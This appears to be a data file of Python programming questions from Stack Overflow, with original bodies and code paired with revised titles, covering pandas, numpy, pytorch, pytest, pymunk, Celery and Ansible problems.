A good way to make python classes for more complex playing card types than those found in a standard deck?," I am extremely new to object-oriented programming, and am trying to begin learning in python by making a simple card game (as seems to be traditional!). I have done the following example which works fine, and teaches me about making multiple instances of the PlayingCard() class to create an instance of the Deck() class: I want to make something now with more complex cards, not just a standard 52 deck (which has nicely incrementing values). The deck I have in mind is the Monopoly card game:There are 3 fundamental types of cards - ACTION cards, PROPERTY cards, and MONEY cards. The action cards perform different actions, the property cards belong to different colour sets, and the money cards can have different values. Additionally, the property cards can be ""wildcards"", and can be used as part of one of two sets. Finally, every card also has an equivalent money value (indicated in the top corner of each card). In the rent action cards, the card can only apply to the colour property indicated on the card.My question is just generally how to handle a situation like this, and what would be a nice way to include these different cards in a class-based python program? Should I keep my single PlayingCard() class, and just have many inputs, such as PlayingCard(type=""PROPERTY"", value=""3M""). Or would it be better to create seperate classes such as ActionPlayingCard(), PropertyPlayingCard(), etc ? Or is there a better way? As I say, I am at the beginning of my learning here, and how to organise these types of situations in terms of the higher level design.Many thanks. <code>  class PlayingCard(object): def __init__(self, suit, val): self.suit = suit self.value = val def print_card(self): print(""{} of {}"".format(self.value, self.suit))class Deck(object): def __init__(self): self.playingcards = [] self.build() def build(self): for s in [""Spades"", ""Clubs"", ""Diamonds"", ""Hearts""]: for v in range(1,14): self.playingcards.append(PlayingCard(s,v))deck = Deck()",A good way to make classes for more complex playing card types than those found in a standard deck?
Bin averaging with multiple conditions in pandas," ProblemI have a target variable x and some additional variables A and B. I want to calculate averages (and other statistics) of x when certain conditions for A and B are met. A real world example would be to calculate the average air temperature (x) from a long series of measurements when solar radiation (A) and wind speed (B) fall into certain pre-defined bin ranges.Potential solutionsI have been able to accomplish this with loops (see example below), but I've learned that I should avoid looping over dataframes. From my research on this site I feel like there is probably a much more elegant / vectorized solution using either pd.cut or np.select, but I frankly couldn't figure out how to do it.ExampleGenerate sample data df.head() output: Calculate bin averages Store the result in a new dataframe binned.head() output: <code>  import pandas as pdimport numpy as npn = 100df = pd.DataFrame( { ""x"": np.random.randn(n), ""A"": np.random.randn(n)+5, ""B"": np.random.randn(n)+10 }) x A B0 -0.585313 6.038620 9.9097621 0.412323 3.991826 8.8368482 0.211713 5.019520 9.6673493 0.710699 5.353677 9.7579034 0.681418 4.452754 10.647738 # define bin rangesbins_A = np.arange(3, 8)bins_B = np.arange(8, 13)# prepare output listsA_mins= []A_maxs= []B_mins= []B_maxs= []x_means= []x_stds= []x_counts= []# loop over binsfor i_A in range(0, len(bins_A)-1): A_min = bins_A[i_A] A_max = bins_A[i_A+1] for i_B in range(0, len(bins_B)-1): B_min = bins_B[i_B] B_max = bins_B[i_B+1] # binning conditions for current step conditions = np.logical_and.reduce( [ df[""A""] > A_min, df[""A""] < A_max, df[""B""] > B_min, df[""B""] < B_max, ] ) # calculate statistics for x and store values in lists x_values = df.loc[conditions, ""x""] x_means.append(x_values.mean()) x_stds.append(x_values.std()) x_counts.append(x_values.count()) A_mins.append(A_min) A_maxs.append(A_max) B_mins.append(B_min) B_maxs.append(B_max) binned = pd.DataFrame( data={ ""A_min"": A_mins, ""A_max"": A_maxs, ""B_min"": B_mins, ""B_max"": B_maxs, ""x_mean"": x_means, ""x_std"": x_stds, ""x_count"": x_counts }) A_min A_max B_min B_max x_mean x_std x_count0 3 4 8 9 0.971624 0.790972 21 3 4 9 10 0.302795 0.380102 32 3 4 10 11 0.447398 1.787659 53 3 4 11 12 0.462149 1.195844 24 4 5 8 9 0.379431 0.983965 4",Pandas Dataframe - Bin on multiple columns & get statistics on another column
python pandas dataframe cell to be locked and used for a running balance calculation conditional of result on another cell on same row," Say I have the following dataframe: As can be seen I am starting column D with 100 at the last row.I am trying to code a calculation for column D so starting from the bottom row (row 19) when a BUY or SELL is shown on column B then the number on column D is locked (eg the 100) and used for a calculation based on col C for each SHODL or BHODL until the row after a BCLOSE or an SCLOSE is shown.The locked number is used to calculate a running balance based on the percentages that are in column C. As you can see on row 16 column C has '10' representing 10%. As 10% of 100 = 10 the new runnning balance is 110. Row 15 column C has 5% as such 5 is added to the running balance to result in 115. The next row 14 column C has a -1% change as such 1% of 100 is = 1 and therefore the new running balance is 114 and so on.The following are the results that should be returned in col D of the dataframe once the right code is run This continues until after a SCLOSE or a BCLOSE is shown as a BCLOSE or SCLOSE row is the final row where the running balance is calculated.As you can see this process is restarted when either a new BUY or SELL is shown. <code>  import pandas as pddf = pd.DataFrame()df['A'] = ('1/05/2019','2/05/2019','3/05/2019','4/05/2019','5/05/2019','6/05/2019','7/05/2019','8/05/2019','9/05/2019','10/05/2019','11/05/2019','12/05/2019','13/05/2019','14/05/2019','15/05/2019','16/05/2019','17/05/2019','18/05/2019','19/05/2019','20/05/2019')df['B'] = ('SIT','SCLOSE', 'SHODL', 'SHODL', 'SHODL', 'SHODL', 'SHODL', 'SELL','SIT','SIT','BCLOSE', 'BHODL', 'BHODL', 'BHODL', 'BHODL', 'BHODL', 'BHODL','BUY','SIT','SIT')df['C'] = (0.00,1.00,10.00, 5.00,6.00,-6.00, 6.00, 0.00,0.00,0.00,-8.00,33.00,-15.00,6.00,-1.00,5.00,10.00,0.00,0.00,0.00)df.loc[19, 'D'] = 100.0000 df['D'] = ('158.60','158.60', '157.30', '144.30', '137.80', '130.00', '137.80', '130.00','130.00','130.00','130.00', '138.00', '105.00', '120.00', '114.00', '115.00', '110.00','100.00','100.00','100.00')",Dataframe cell to be locked and used for a running balance calculation conditional of result on another cell on same row
Python: How to subset list elements that lie between two missing values?," With a list containing some missing values such as this: How can you subset the values that are positioned between two missing (nan) values?I know how to do it with a for loop : Any suggestions on how to do this in a less cumbersome way? <code>  [10, 11, 12,np.nan, 14, np.nan, 16, 17, np.nan, 19, np.nan] # importsimport numpy as np# inputlst=[10,11,12,np.nan, 14, np.nan, 16, 17, np.nan, 19, np.nan]# define an empty list and build on that in a For Loopsubset=[]for i, elem in enumerate(lst): if np.isnan(lst[i-1]) and np.isnan(lst[i+1]): subset.extend([elem])print(subset)# output# [14, 19]",How to subset list elements that lie between two missing values?
Check if pandas column contains at least all elements from a list," I have a df like this: And a list of items: My goal is to get all the rows from frame that contain at least the 2 elements in lettersI came up with this solution: This gives me what I want, but it might not be the best solution in terms of scalability.Is there any 'vectorised' solution?Thanks <code>  frame = pd.DataFrame({'a' : ['a,b,c', 'a,c,f', 'b,d,f','a,z,c']}) letters = ['a','c'] for i in letters: subframe = frame[frame['a'].str.contains(i)]",Check if pandas column contains all elements from a list
list of lists to list of ints python," i have list with lists of strings looks like i need to have output like this: have been try this: but i have error <code>  allyears#[['1916'], ['1919'], ['1922'], ['1912'], ['1924'], ['1920']] #[1916, 1919, 1922, 1912, 1924, 1920] for i in range(0, len(allyears)): allyears[i] = int(allyears[i]) >>> TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'",Flatten a list of lists containing single strings to a list of ints
Zipped Python generators with 2nd one being shorter: one element is consumed silently," I want to parse 2 generators of (potentially) different length with zip: However, if gen2 has less elements, one extra element of gen1 is ""consumed"".For example, Apparently, a value is missing (8 in my previous example) because gen1 is read (thus generating the value 8) before it realizes gen2 has no more elements. But this value disappears in the universe. When gen2 is ""longer"", there is no such ""problem"".QUESTION: Is there a way to retrieve this missing value (i.e. 8 in my previous example)? ... ideally with a variable number of arguments (like zip does).NOTE: I have currently implemented in another way by using itertools.zip_longest but I really wonder how to get this missing value using zip or equivalent.NOTE 2: I have created some tests of the different implementations in this REPL in case you want to submit and try a new implementation :) https://repl.it/@jfthuong/MadPhysicistChester <code>  for el1, el2 in zip(gen1, gen2): print(el1, el2) def my_gen(n:int): for i in range(n): yield igen1 = my_gen(10)gen2 = my_gen(8)list(zip(gen1, gen2)) # Last tuple is (7, 7)print(next(gen1)) # printed value is ""9"" => 8 is missinggen1 = my_gen(8)gen2 = my_gen(10)list(zip(gen1, gen2)) # Last tuple is (7, 7)print(next(gen2)) # printed value is ""8"" => OK",Zipped Python generators with 2nd one being shorter: how to retrieve element that is silently consumed
PyTorch torch.max(beetwen dim)," Have tensor like :x.shape = [3, 2, 2]. I need to take .max() over the 2nd and 3rd dimensions. I expect some like this [-0.2632, -0.1453, -0.0274] as output. I tried to use: x.max(dim=(1,2)), but this causes an error. <code>  import torchx = torch.tensor([ [[-0.3000, -0.2926],[-0.2705, -0.2632]], [[-0.1821, -0.1747],[-0.1526, -0.1453]], [[-0.0642, -0.0568],[-0.0347, -0.0274]]])",PyTorch torch.max over multiple dimensions
I can't import xml.don.minidom in PyCharm. What could I Try?," I'm trying to import xml.dom.minidom but pycharm doesn't find it, altough it finds xml.entree / xml.parser / xml.sax.The rest of the standart libraries work all fine.The xml file (beispiel.xml) shouldn't be the problem, because it hasn't ""xml"" in the name. I'm not shure, what it could be. It could be, because i have installed python in D:... and pycharm in C:... but i dont think that's the problem. <code>  from xml.dom import minidom document = minidom.parse(""beispiel.xml"") wanted_info = input(""Which prduct do you want to see?"") product_list = document.getElementsByTagName(wanted_info) for product in product_list: for value in product.childNodes: if value.nodeType == minidom.Node.ELEMENT_NODE: print(value.tagName + "":"" + value.firstChild.data) print(""\n"")",I can't import xml.dom.minidom in PyCharm. What could I Try?
"What is exactly ""=="" in this situation?"," I just can't figure out what ""=="" means at the second line:- It is not a test, there is no if statement...- It is not a variable declaration...I've never seen this before, the thing is data.ctage==cat is a pandas Series and not a test... <code>  for cat in data[""categ""].unique(): subset = data[data.categ == cat] # Cration du sous-chantillon print(""-""*20) print('Catgorie : ' + cat) print(""moyenne:\n"",subset['montant'].mean()) print(""mediane:\n"",subset['montant'].median()) print(""mode:\n"",subset['montant'].mode()) print(""VAR:\n"",subset['montant'].var()) print(""EC:\n"",subset['montant'].std()) plt.figure(figsize=(5,5)) subset[""montant""].hist(bins=30) # Cre l'histogramme plt.show() # Affiche l'histogramme","Why does using ""=="" return a Series instead of bool in pandas?"
How to configure Celery Worker for Email Reporting in Apache Superset running on Docker?," I am running Superset via Docker. I enabled the Email Report feature and tried it:However, I only receive the test email report. I don't receive any emails after.This is my CeleryConfig in superset_config.py: The documentation says I need to run the celery worker and beat. I added them to the 'docker-compose.yml': Celery Worker is indeed working when sending the first email. The log file is also visible. However, the celery beat seems to not be functioning. There is also no 'celery_beat.log' created.If you'd like a deeper insight, here's the commit with the full implementation of the functionality.How do I correctly configure celery beat? How can I debug this? <code>  class CeleryConfig(object): BROKER_URL = 'sqla+postgresql://superset:superset@db:5432/superset' CELERY_IMPORTS = ( 'superset.sql_lab', 'superset.tasks', ) CELERY_RESULT_BACKEND = 'db+postgresql://superset:superset@db:5432/superset' CELERYD_LOG_LEVEL = 'DEBUG' CELERYD_PREFETCH_MULTIPLIER = 10 CELERY_ACKS_LATE = True CELERY_ANNOTATIONS = { 'sql_lab.get_sql_results': { 'rate_limit': '100/s', }, 'email_reports.send': { 'rate_limit': '1/s', 'time_limit': 120, 'soft_time_limit': 150, 'ignore_result': True, }, } CELERYBEAT_SCHEDULE = { 'email_reports.schedule_hourly': { 'task': 'email_reports.schedule_hourly', 'schedule': crontab(minute=1, hour='*'), }, } celery worker --app=superset.tasks.celery_app:app --pool=prefork -O fair -c 4celery beat --app=superset.tasks.celery_app:app superset-worker: build: *superset-build command: > sh -c ""celery worker --app=superset.tasks.celery_app:app -Ofair -f /app/celery_worker.log && celery beat --app=superset.tasks.celery_app:app -f /app/celery_beat.log"" env_file: docker/.env restart: unless-stopped depends_on: *superset-depends-on volumes: *superset-volumes",How to configure Celery Worker and Beat for Email Reporting in Apache Superset running on Docker?
pymunk can't lock rotation of springs attached to wheels of car," I want to be able to lock the angle of the wheels relative to the car's chassis. In between the wheels, there are springs, that should allow the car to suspend, but right now, the angle is not locked. I am using pymunk's function ""RotaryLimitJoint""A behavior like this is the goal (gif)Right now it looks like this:My code: <code>  car_pos = Vec2d(100,500)mass = 30radius = 10moment = pymunk.moment_for_circle(mass, 20, radius)wheel1_b = pymunk.Body(mass, moment)wheel1_s = pymunk.Circle(wheel1_b, radius)wheel1_s.friction = 1.5wheel1_s.color = wheel_colorspace.add(wheel1_b, wheel1_s)mass = 30radius = 10moment = pymunk.moment_for_circle(mass, 20, radius)wheel2_b = pymunk.Body(mass, moment)wheel2_s = pymunk.Circle(wheel2_b, radius)wheel2_s.friction = 1.5wheel2_s.color = wheel_colorspace.add(wheel2_b, wheel2_s)mass = 100size = (80,25)moment = pymunk.moment_for_box(mass, size)chassi_b = pymunk.Body(mass, moment)chassi_s = pymunk.Poly.create_box(chassi_b, size)chassi_s.color = chassi_colorspace.add(chassi_b, chassi_s)#Positionschassi_b.position = car_pos + (0,-15)wheel1_b.position = car_pos + (-25,0)wheel2_b.position = car_pos + (25,0)#Jointsspring1 = pymunk.DampedSpring(chassi_b, wheel1_b, (-25,0), (0,0), 20, 100000, 1)spring1.collide_bodies = Falsespring2 = pymunk.DampedSpring(chassi_b, wheel2_b, (25,0), (0,0), 20, 100000, 1)spring2.collide_bodies = FalsewheelAngle1 = pymunk.RotaryLimitJoint(wheel1_b, chassi_b, 0, 0)wheelAngle1.collide_bodies = FalsewheelAngle2 = pymunk.RotaryLimitJoint(chassi_b, wheel2_b, 0, 0)wheelAngle2.collide_bodies = Falsespace.add( spring1, spring2, wheelAngle1, wheelAngle2)speed = 20space.add( pymunk.SimpleMotor(wheel1_b, chassi_b, speed), pymunk.SimpleMotor(wheel2_b, chassi_b, speed))",Balance box on wheels with springs (lock rotation relative to box) pymunk
How to use the new NumPy randon number generator?," The fact that NumPy now recommends that new code uses the defacult_rng() instance instead of numpy.random for new code has got me thinking about how it should be used to yield good results, both performance vice and statistically. This first example is how I first wanted to write: But I have also considered creating a new instance in every function call: A third alternative would be to pass the rng as an argument in the function call. This way the same rng can be used in other parts of the code as well. This is used in a simulation environment that is going to be called often to sample, for example, transition times. I guess the question is if there are arguments for any of these three methods and if there exists some kind of praxis? Also, any reference to more in-depth explanations of using these random number generators (except for the NumPy doc and Random Sampling article) is of great interest!  <code>  import numpy as npclass fancy_name(): def __init__(self): self.rg = np.random.default_rng() self.gamma_shape = 1.0 self.gamma_scale = 1.0 def public_method(self, input): # Do intelligent stuff with input return self.rg.gamma(self.gamma_shape, slef.gamma_scale) import numpy as npclass fancy_name(): def __init__(self): self.gamma_shape = 1.0 self.gamma_scale = 1.0 def public_method(self, input): # Do intelligent stuff with input rg = np.random.default_rng() return rg.gamma(self.gamma_shape, slef.gamma_scale)",How to use the new NumPy random number generator?
Is there a way to grab the last item of a," Say I have a DataFrame I want to grab row 2, 5, 6 and 10 because these are the last row for each value in Column 1. Let's say Column 1 is an ID and Column 2 indicates the number of that ID. I need it to pick the maximum number in Column 2 for each number in Column 1 and keep Column 3 without changing Column 2 and 3 pairs. So I go from to If I do I do not get what I want, because it will max both column 2 and 3.  <code>  data = {'Column 1': [ 1, 1, 2, 2, 2, 3, 4, 4, 4, 4], 'Column 2': [ 1, 2, 1, 2, 3, 1, 1, 2, 3, 4], 'Column 3': [ 1, 2, 1, 4, 3, 6, 1, 2, 7, 5]}df = pd.DataFrame(data=data) 1 1 11 2 22 1 12 2 42 3 33 1 64 1 14 2 24 3 74 4 5 1 2 22 3 33 1 64 4 5 df.groupby(['Column 1']).max()",Is there a way to grab the last item of a group
Maximum inscribed 3D ellipsoid inside a polytope/set of points," Later Edit: I uploaded here a sample of my original data. It's actually a segmentation image in the DICOM format. The volume of this structure as it is it's ~ 16 mL, so I assume the inner ellipsoid volume should be smaller than that. to extract the points from the DICOM image I used the following code: I have a set of points (n > 1000) in 3D space that describe a hollow ovoid like shape. What I would like is to fit an ellipsoid (3D) that is inside all of the points. I am looking for the maximum volume ellipsoid fitting inside the points.I tried to adapt the code from Minimum Enclosing Ellipsoid (aka outer bounding ellipsoid) by modifying the threshold err > tol, with my logic begin that all points should be smaller than < 1 given the ellipsoid equation. But no success.I also tried the Loewner-John adaptation on mosek, but I didn't figure how to describe the intersection of a hyperplane with 3D polytope (the Ax <= b representation) so I can use it for the 3D case. So no success again.The code from the outer ellipsoid: Which gives me this result for the outer ellipsoid on my sample points: The main question: How do I fit an ellipsoid (3D) inside a cloud of 3D points using Python? Is it possible to modify the algorithm for the outer ellipsoid to get the maximum inscribed (inner) ellipsoid?I am looking for code in Python ideally. <code>  import osimport numpy as npimport SimpleITK as sitkdef get_volume_ml(image): x_spacing, y_spacing, z_spacing = image.GetSpacing() image_nda = sitk.GetArrayFromImage(image) imageSegm_nda_NonZero = image_nda.nonzero() num_voxels = len(list(zip(imageSegm_nda_NonZero[0], imageSegm_nda_NonZero[1], imageSegm_nda_NonZero[2]))) if 0 >= num_voxels: print('The mask image does not seem to contain an object.') return None volume_object_ml = (num_voxels * x_spacing * y_spacing * z_spacing) / 1000 return volume_object_mldef get_surface_points(folder_path): """""" :param folder_path: path to folder where DICOM images are stored :return: surface points of the DICOM object """""" # DICOM Series reader = sitk.ImageSeriesReader() dicom_names = reader.GetGDCMSeriesFileNames(os.path.normpath(folder_path)) reader.SetFileNames(dicom_names) reader.MetaDataDictionaryArrayUpdateOn() reader.LoadPrivateTagsOn() try: dcm_img = reader.Execute() except Exception: print('Non-readable DICOM Data: ', folder_path) return None volume_obj = get_volume_ml(dcm_img) print('The volume of the object in mL:', volume_obj) contour = sitk.LabelContour(dcm_img, fullyConnected=False) contours = sitk.GetArrayFromImage(contour) vertices_locations = contours.nonzero() vertices_unravel = list(zip(vertices_locations[0], vertices_locations[1], vertices_locations[2])) vertices_list = [list(vertices_unravel[i]) for i in range(0, len(vertices_unravel))] surface_points = np.array(vertices_list) return surface_pointsfolder_path = r""C:\Users\etc\TTT [13]\20160415 114441\Series 052 [CT - Abdomen WT 1 0 I31f 3]""points = get_surface_points(folder_path) import numpy as npimport numpy.linalg as laimport matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3Dpi = np.pisin = np.sincos = np.cosdef plot_ellipsoid(A, centroid, color, ax):"""""":param A: matrix:param centroid: center:param color: color:param ax: axis:return:""""""centroid = np.asarray(centroid)A = np.asarray(A)U, D, V = la.svd(A)rx, ry, rz = 1. / np.sqrt(D)u, v = np.mgrid[0:2 * np.pi:20j, -np.pi / 2:np.pi / 2:10j]x = rx * np.cos(u) * np.cos(v)y = ry * np.sin(u) * np.cos(v)z = rz * np.sin(v)E = np.dstack((x, y, z))E = np.dot(E, V) + centroidx, y, z = np.rollaxis(E, axis=-1)ax.plot_wireframe(x, y, z, cstride=1, rstride=1, color=color, alpha=0.2)ax.set_zlabel('Z-Axis')ax.set_ylabel('Y-Axis')ax.set_xlabel('X-Axis')def mvee(points, tol = 0.001): """""" Finds the ellipse equation in ""center form"" (x-c).T * A * (x-c) = 1 """""" N, d = points.shape Q = np.column_stack((points, np.ones(N))).T err = tol+1.0 u = np.ones(N)/N while err > tol: # assert u.sum() == 1 # invariant X = np.dot(np.dot(Q, np.diag(u)), Q.T) M = np.diag(np.dot(np.dot(Q.T, la.inv(X)), Q)) jdx = np.argmax(M) step_size = (M[jdx]-d-1.0)/((d+1)*(M[jdx]-1.0)) new_u = (1-step_size)*u new_u[jdx] += step_size err = la.norm(new_u-u) u = new_u c = np.dot(u,points) A = la.inv(np.dot(np.dot(points.T, np.diag(u)), points) - np.multiply.outer(c,c))/d return A, cfolder_path = r"""" # path to a DICOM img folderpoints = get_surface_points(folder_path) # or some random pts A, centroid = mvee(points) U, D, V = la.svd(A) rx_outer, ry_outer, rz_outer = 1./np.sqrt(D)# PLOTfig = plt.figure()ax1 = fig.add_subplot(111, projection='3d')ax1.scatter(points[:, 0], points[:, 1], points[:, 2], c='blue')plot_ellipsoid(A, centroid, 'green', ax1)",Maximum volume inscribed ellipsoid in a polytope/set of points
How can I get only rgb of plt imgread?," Hello I am reading an image with and this returns the following shape:100, 100, 4What can I do to only get the rgb, that is to say100, 100, 3 <code>  plt.imread('photo.png') ",How can I get only rgb of plt.imread?
How to sum an array in a dictionary?," I have a dictionary surnames: I would like to sum all arrays and save them in the same dictionary so that the sum replaces the array: I tried this: I assume this doesn't work because it only sums single values of the same key? I also tried this: I understand why this doesn't work either, but what else can I do? <code>  import numpy as npsurnames = { 'Sophie': np.array([138, 123]), 'Marie': np.array([126, 1, 50, 1]), 'Maximilian': np.array([111, 74]), 'Alexander': 87, 'Maria': np.array([85, 15, 89, 2]), 'Paul': np.array([70, 59]), 'Katharina': 69, 'Felix': np.array([61, 53]), 'Anna': np.array([57, 58]), 'Ben': np.array([49, 47])} { 'Sophie': 261, 'Marie': 178, 'Maximilian': 185, 'Alexander': 87, 'Maria': 191, 'Paul': 129, 'Katharina': 69, 'Felix': 114, 'Anna': 115, 'Ben': 96} new_dict = dict()for k, v in surnames: new_dict.update({k:sum(v)}) data = list(surnames.values())cl_surnames = np.array(data)cl_surnames = np.sum(cl_surnames, 0)",Replace values in a dictionary of NumPy arrays and single numbers with sums
"How to solve ""Declared return type is partially unknown"" warning from pyright?"," I'm using strict type checks via pyright.When I have a method that returns a pytorch DataLoader, then pyright complains about my type definition: Declared return type, ""DataLoader[Unknown]"", is partially unknown Pyright (reportUnknownVariableType)Taking a look at the type stub from pytorch's DataLoader (reduced to the important parts): As far as I can see, the generic type T_co of the DataLoader should be defined by the __init__ dataset parameter.Pyright also complains about my Dataset type definition: Type of parameter ""dataset"" is partially unknown Parameter type is ""Dataset[Unknown]"" Pyright (reportUnknownParameterType)Taking a look at the Dataset type stub: shows to me that the type should be inferred by the return type of __getitem__.My dataset's type signature of __getitem__ looks like this: Based on this I would expect Dataset and DataLoader to be inferred as Dataset[Tuple[Tensor, Tensor]] and DataLoader[Tuple[Tensor, Tensor]] but that is not the case.My guess is that pyright fails to statically infer the types here.I thought I could define the type signature my self like this: but that actually results in my python script crashing with: TypeError: 'type' object is not subscriptableHow can I properly define the type for Dataset and DataLoader? <code>  class DataLoader(Generic[T_co]): dataset: Dataset[T_co] @overload def __init__(self, dataset: Dataset[T_co], ... class Dataset(Generic[T_co]): def __getitem__(self, index: int) -> T_co: ... def __getitem__(self, index: int) -> Tuple[Tensor, Tensor]: Dataset[Tuple[Tensor, Tensor]]","How to solve ""type is partially unknown"" warning from pyright?"
Change pytest working directory to test class directory," I have the following pytest directory structure: When each test method runs, a number of third-party libraries/processes generate artifacts in the current working directory.When pytest is executed from the sub_suite folder (using CLI or IDE ""play"" button), the files are generated in the sub_suite folder, where I want them to be.However, when pytest is run from the system_tests folder to run all tests, all artifacts are created in the system_tests folder, which is not what I want.Is there an easy way to force pytest to always use the test class folder as the working directory so I get the same results regardless of how or where I run a test from? <code>  system_tests/ conftest pytest.ini suite_1/ test_A.py suite_2/ sub_suite_2a/ test_B.py",Change pytest working directory to test case directory
Did I/O or dictionaries become slower since Python 2.7?," I'm currently having a small side project in which I want to sort a 20GB file on my machine as fast as possible. The idea is to chunk the file, sort the chunks, merge the chunks. I just used pyenv to time the radixsort code with different Python versions and saw that 2.7.18 is way faster than 3.6.10, 3.7.7, 3.8.3 and 3.9.0a. Can anybody explain why Python 3.x is slower than 2.7.18 in this simple example? Were there new features added? Execution times (multiple runs):2.7.18: 192.2s, 220.3s, 225.8s3.6.10: 302.5s3.7.7: 308.5s3.8.3: 279.8s, 279.7s (binary mode), 295.3s (binary mode), 307.7s, 380.6s (wtf?)3.9.0a: 292.6sThe complete code is on Github, along with a minimal complete versionUnicodeYes, I know that Python 3 and Python 2 deal different with strings. I tried opening the files in binary mode (rb / wb), see the ""binary mode"" comments. They are a tiny bit faster on a couple of runs. Still, Python 2.7 is WAY faster on all runs.Try 1: Dictionary accessWhen I phrased this question, I thought that dictionary access might be a reason for this difference. However, I think the total execution time is way less for dictionary access than for I/O. Also, timeit did not show anything important: Try 2: Copy timeAs a simplified experiment, I tried to copy the 20GB file:cp via shell: 230sPython 2.7.18: 237s, 249sPython 3.8.3: 233s, 267s, 272sThe Python stuff is generated by the following code.My first thought was that the variance is quite high. So this could be the reason. But then, the variance of chunk_data execution time is also high, but the mean is noticeably lower for Python 2.7 than for Python 3.x. So it seems not to be an I/O scenario as simple as I tried here. My SystemUbuntu 20.04Thinkpad T460pPython through pyenv <code>  import osdef chunk_data(filepath, prefixes): """""" Pre-sort and chunk the content of filepath according to the prefixes. Parameters ---------- filepath : str Path to a text file which should get sorted. Each line contains a string which has at least 2 characters and the first two characters are guaranteed to be in prefixes prefixes : List[str] """""" prefix2file = {} for prefix in prefixes: chunk = os.path.abspath(""radixsort_tmp/{:}.txt"".format(prefix)) prefix2file[prefix] = open(chunk, ""w"") # This is where most of the execution time is spent: with open(filepath) as fp: for line in fp: prefix2file[line[:2]].write(line) import timeitimport numpy as npdurations = timeit.repeat( 'a[""b""]', repeat=10 ** 6, number=1, setup=""a = {'b': 3, 'c': 4, 'd': 5}"")mul = 10 ** -7print( ""mean = {:0.1f} * 10^-7, std={:0.1f} * 10^-7"".format( np.mean(durations) / mul, np.std(durations) / mul ))print(""min = {:0.1f} * 10^-7"".format(np.min(durations) / mul))print(""max = {:0.1f} * 10^-7"".format(np.max(durations) / mul)) import timeimport sysimport osversion = sys.version_infoversion = ""{}.{}.{}"".format(version.major, version.minor, version.micro)if os.path.isfile(""numbers-tmp.txt""): os.remove(""numers-tmp.txt"")t0 = time.time()with open(""numbers-large.txt"") as fin, open(""numers-tmp.txt"", ""w"") as fout: for line in fin: fout.write(line)t1 = time.time()print(""Python {}: {:0.0f}s"".format(version, t1 - t0))",Did I/O become slower since Python 2.7?
How can I obtain an accurate coverage report when testing a pyest plugin?," ContextI am updating an inherited repository which has poor test coverage. The repo itself is a pytest plugin. I've changed the repo to use tox along with pytest-cov, and converted the ""raw"" tests to use pytester as suggested in the pytest documentation when testing plugins.The testing and tox build, etc. works great. However, the coverage is reporting false misses with things like class definitions, imports, etc. This is because the code itself is being imported as part of pytest instantiation, and isn't getting ""covered"" until the testing actually starts.I've read pytest docs, pytest-cov and coverage docs, and tox docs, and tried several configurations, but to no avail. I've exhausted my pool of google keyword combinations that might lead me to a good solution.Repository layout Some relevant snippets with commentary:tox.ini This configuration gives me an error that no data was collected; no htmlcov is created in this case.If I just use --cov, I get (expected) very noisy coverage, which shows the functional hits and misses, but with the false misses reported above for imports, class definitions, etc.conftest.py test_my_plugin.py How can I get an accurate report? Is there a way to defer the plugin loading until it's demanded by the pytester tests? <code>  pkg_root/ .tox/ py3/ lib/ python3.7/ site-pacakges/ plugin_module/ supporting_module.py plugin.py some_data.dat plugin_module/ supporting_module.py plugin.py some_data.dat tests/ conftest.py test_my_plugin.py tox.ini setup.py [pytest]addopts = --cov={envsitepackagesdir}/plugin_module --cov-report=htmltestpaths = tests pytest_plugins = ['pytester'] # Entire contents of file! def test_a_thing(testdir): testdir.makepyfile( """""" def test_that_fixture(my_fixture): assert my_fixture.foo == 'bar' """""" ) result = testdir.runpytest() result.assert_outcomes(passed=1)",How to get coverage reporting when testing a pytest plugin?
Python pandas simple yet strange behaviour (can somebody explain)," It's a pretty simple example output Why is the datatype different for both columns?Python 3.7.3pandas version: 0.23.4 <code>  import pandasdf = pandas.DataFrame()value_to_be_set = {'1'}df.loc[0, 'col1'] = value_to_be_setdf['col2'] = Nonedf.loc[0, 'col2'] = value_to_be_setprint(df.head()) col1 col20 1 {1}",Inconsistent behavior when inserting a set into cells using .loc in pandas
Ansible error when trying add group: AttributeError: module 'platform' has no attribute 'dist'," I want to add group in remote machine via ansible playbook and i get error.This is my code from playbook: and this is error what I get: My ansible running on WSL: Please help. <code>  - name: Ensure group for deploy_user exists become: yes group: name: ""{{ deploy_user }}"" state: present fatal: [webserver]: FAILED! => {""changed"": false,""module_stderr"": ""mux_client_request_session: read from master failed: Broken pipe\r\nShared connection to server closed.\r\n"",""module_stdout"": ""Traceback (most recent call last):\r\n File \""/tmp/ansible_46blg1ge/ansible_modlib.zip/ansible/module_utils/basic.py\"", line 274, in get_distribution\r\nAttributeError: module 'platform' has no attribute '_supported_dists'\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n File \""/tmp/ansible_46blg1ge/ansible_module_group.py\"", line 478, in <module>\r\n main()\r\n File \""/tmp/ansible_46blg1ge/ansible_module_group.py\"", line 426, in main\r\n group = Group(module)\r\n File \""/tmp/ansible_46blg1ge/ansible_module_group.py\"", line 80, in __new__\r\n return load_platform_subclass(Group, args, kwargs)\r\n File \""/tmp/ansible_46blg1ge/ansible_modlib.zip/ansible/module_utils/basic.py\"", line 332, in load_platform_subclass\r\n File \""/tmp/ansible_46blg1ge/ansible_modlib.zip/ansible/module_utils/basic.py\"", line 284, in get_distribution\r\nAttributeError: module 'platform' has no attribute 'dist'\r\n"",""msg"": ""MODULE FAILURE"",""rc"": 1 } ansible 2.5.1config file = /etc/ansible/ansible.cfg configured module search path = [u'/home/rideto/.ansible/plugins/modules', u'/usr/share/ansible/plugins/modules'] ansible python module location = /usr/lib/python2.7/dist-packages/ansibleexecutable location = /usr/bin/ansiblepython version = 2.7.17 (default, Apr 15 2020, 17:20:14) [GCC 7.5.0]",Ansible error: AttributeError: module 'platform' has no attribute 'dist'
Python : Wait for the first subprecess to finish," I have a list of subprocess' processes. I do not communicate with them and just wait.I want to wait for the first process to finish (this solution works): I don't want use os.wait(), cause it could return from another subprocess not part of the list I'm waiting for.A nice and elegant solution would probably be with an epoll or select and without any loop. <code>  import subprocessa = subprocess.Popen(['...'])b = subprocess.Popen(['...'])# wait for the first process to finishwhile True: over = False for child in {a, b}: try: rst = child.wait(timeout=5) except subprocess.TimeoutExpired: continue # this subprocess is still running if rst is not None: # subprocess is no more running over = True break # If either subprocess exits, so do we. if over: break",Wait for the first subprocess to finish
